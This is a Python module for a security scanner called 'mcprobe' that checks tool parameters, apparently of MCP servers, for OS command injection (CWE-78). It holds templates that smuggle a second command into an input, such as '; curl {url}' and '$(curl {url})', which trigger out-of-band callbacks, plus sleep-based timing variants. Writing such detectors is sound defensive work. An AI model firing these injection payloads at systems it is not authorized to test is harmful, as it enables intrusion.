from mcprobe.models import Probe, Finding, Severity, Confidence
from mcprobe.checks.base import register

_SLEEP_SECONDS = 5
_LATENCY_MULT = 3

# OOB confirmation payloads: each triggers an outbound request to {url}. Covers POSIX
# sh, Windows cmd.exe, and PowerShell, deduped. Non-blocking (always sent).
_OOB_TEMPLATES = (
    "; curl {url}",          # POSIX
    "$(curl {url})",         # POSIX command substitution
    "& curl {url}",          # cmd.exe / POSIX background
    "| curl {url}",          # cmd.exe / POSIX pipe
    "; iwr {url}",           # PowerShell (Invoke-WebRequest)
    "; curl.exe {url}",      # PowerShell (real curl, not the iwr alias)
)

# Blocking time-based payloads (~_SLEEP_SECONDS delay), sent only with --aggressive.
_SLEEP_TEMPLATES = (
    "; sleep {n}",                # POSIX
    "$(sleep {n})",               # POSIX command substitution
    "& ping -n {n1} 127.0.0.1",   # cmd.exe (no sleep builtin; ping ~1s/echo)
    "; Start-Sleep -s {n}",       # PowerShell
)

@register
class CmdInjection:
    id = "cmd_injection"
    def generate(self, point, ctx):
        probes = []
        if ctx.oob is not None:
            for tpl in _OOB_TEMPLATES:
                token, url = ctx.oob.new_token()
                pl = f"mcprobe{tpl.format(url=url)}"
                probes.append(Probe(check=self.id, point=point, payload=pl,
                                    args=point.set(pl), token=token))
        if getattr(ctx, "aggressive", False):
            for tpl in _SLEEP_TEMPLATES:
                pl = f"mcprobe{tpl.format(n=_SLEEP_SECONDS, n1=_SLEEP_SECONDS + 1)}"
                probes.append(Probe(check=self.id, point=point, payload=pl, args=point.set(pl),
                                    meta={"time_based": True, "threshold": _SLEEP_SECONDS}))
        return probes
    def evaluate(self, probe, response, ctx):
        if probe.token and ctx.oob and ctx.oob.interactions(probe.token):
            return self._finding(probe, Confidence.CONFIRMED,
                                 f"OOB callback received for payload {probe.payload!r}")
        if probe.meta.get("time_based"):
            elapsed = probe.meta.get("elapsed", 0)
            sleep_s = probe.meta["threshold"]
            baseline = getattr(ctx, "baseline", None)
            if baseline is not None:
                margin = max(baseline.latency + sleep_s * 0.8, baseline.latency * _LATENCY_MULT)
                evidence = f"response delayed {elapsed:.1f}s vs baseline {baseline.latency:.1f}s"
            else:
                margin = sleep_s  # no calibration: fall back to the fixed threshold
                evidence = f"response delayed {elapsed:.1f}s"
            if elapsed >= margin:
                return self._finding(probe, Confidence.FIRM, evidence)
        return None
    def _finding(self, probe, conf, evidence):
        return Finding(check=self.id, tool=probe.point.tool, param=probe.point.param_name,
                       severity=Severity.CRITICAL, confidence=conf, cwe="CWE-78",
                       title=f"Command injection in {probe.point.tool}.{probe.point.param_name}",
                       payload=probe.payload, evidence=evidence,
                       remediation="Never pass tool input to a shell; use exec with arg arrays / allowlists.")
